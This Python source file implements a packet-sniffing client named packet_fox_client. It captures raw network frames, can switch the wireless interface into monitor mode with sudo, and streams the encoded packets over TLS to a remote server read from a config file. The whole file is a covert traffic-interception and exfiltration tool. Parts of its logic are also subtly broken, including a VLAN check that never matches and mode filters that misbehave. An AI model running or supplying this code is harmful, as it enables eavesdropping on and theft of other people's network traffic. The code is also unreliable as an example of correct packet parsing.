import base64
import binascii
import re
import os
import psutil
import socket
import ssl
import struct
import sys
import threading
from sys import platform
from TheSilent.clear import clear

def ip_sniff(server):
    internal_ip_list = ["10","192.168","172.16","172.17","172.18","172.19","172.20","172.21","172.22","172.23","172.24","172.25","172.26","172.27","172.28","172.29","172.30","172.31"]
    port_list = []
    with open("mode.txt","r") as file:
        mode = file.read()
        mode = re.sub("[\s\t\r\n]","",mode)

    with open("ports.txt","r") as file:
        for port in file:
            port = re.sub("\s","",port)
            port_list.append(port)

    ip_socket = socket.socket(socket.AF_PACKET,socket.SOCK_RAW,socket.ntohs(3))
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)

    while True:
        send_ip = True
        send_port = False
        try:
            with socket.socket(socket.AF_INET,socket.SOCK_STREAM,0) as sock:
                with context.wrap_socket(sock,server_hostname=server) as secure_sock:
                    secure_sock.connect((server,443))
                    packet = ip_socket.recv(65536)

                    vlan_check = packet[12:16]
                    vlan_unpack = struct.unpack("!4s", vlan_check)
                    if str(vlan_unpack) == "8100":
                        ip_header = packet[30:38]
                        super_ip_header = struct.unpack("!4s4s", ip_header)
                        destination = socket.inet_ntoa(super_ip_header[1])
                        source = socket.inet_ntoa(super_ip_header[0])
                        source_port = packet[38:40]
                        source_port = struct.unpack("!2s", source_port)
                        source_port = binascii.hexlify(source_port[0])
                        source_port = str(int(source_port, 16))
                        destination_port = packet[40:42]
                        destination_port = struct.unpack("!2s", destination_port)
                        destination_port = binascii.hexlify(destination_port[0])
                        destination_port = str(int(destination_port, 16))

                    else:
                        ip_header = packet[26:34]
                        super_ip_header = struct.unpack("!4s4s", ip_header)
                        destination = socket.inet_ntoa(super_ip_header[1])
                        source = socket.inet_ntoa(super_ip_header[0])
                        source_port = packet[34:36]
                        source_port = struct.unpack("!2s", source_port)
                        source_port = binascii.hexlify(source_port[0])
                        source_port = str(int(source_port, 16))
                        destination_port = packet[36:38]
                        destination_port = struct.unpack("!2s", destination_port)
                        destination_port = binascii.hexlify(destination_port[0])
                        destination_port = str(int(destination_port, 16))

                    if mode == "0":
                        send_ip = False
                        break

                    if mode == "1":
                        for ip in internal_ip_list:
                            if not source.startswith(ip) or not destination.startswith(ip):
                                send_ip = False
                                break

                    if mode == "2":
                        for ip in internal_ip_list:
                            if not source.startswith(ip) and destination.startswith(ip) or not destination.startswith(ip) and source.startswith(ip):
                                send_ip = False
                                break

                    if mode == "3":
                        send_ip = True

                    for port in port_list:
                        if source_port == port or destination_port == port:
                            send_port = True
                            break

                    if port_list[0] == "all":
                        send_port = True

                    if send_ip and send_port:
                        secure_sock.sendall(base64.b64encode(binascii.hexlify(packet).decode().encode()))

        except:
            continue

def lan_sniff(server):
    interface_list = psutil.net_if_addrs()
    for interfaces in interface_list.keys():
        interface = interfaces
    
    lan_socket = socket.socket(socket.AF_PACKET,socket.SOCK_RAW,socket.ntohs(3))
    lan_socket.bind((interface,0))
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)

    while True:
        try:
            with socket.socket(socket.AF_INET,socket.SOCK_STREAM,0) as sock:
                with context.wrap_socket(sock,server_hostname=server) as secure_sock:
                    secure_sock.connect((server,443))
                    packet = lan_socket.recv(65536)
                    secure_sock.sendall(base64.b64encode(binascii.hexlify(packet).decode().encode()))

        except OSError:
            os.system(f"sudo ip link set {interface} down")
            os.system(f"sudo iw {interface} set monitor control")
            os.system(f"sudo ip link set {interface} up")
            continue

        except:
            continue

def packet_fox_client():
    with open("server.txt","r") as file:
        server = file.read()
        server = re.sub("[\s\t\r\n]","",server)

    with open("payloads.txt", "r") as file:
        payloads = file.read()
        payloads = re.sub("[\s\t\r\n]","",payloads)

    clear()
    if platform != "linux":
        print("Unsupported platform! Linux is required for this tool!")
        sys.exit()

    if payloads == "01":
        ip_thread = threading.Thread(target=ip_sniff,args=[server]).start()

    if payloads == "10":
        lan_thread = threading.Thread(target=lan_sniff,args=[server]).start()

    if payloads == "11":
        ip_thread = threading.Thread(target=ip_sniff,args=[server]).start()
        lan_thread = threading.Thread(target=lan_sniff,args=[server]).start()

packet_fox_client()
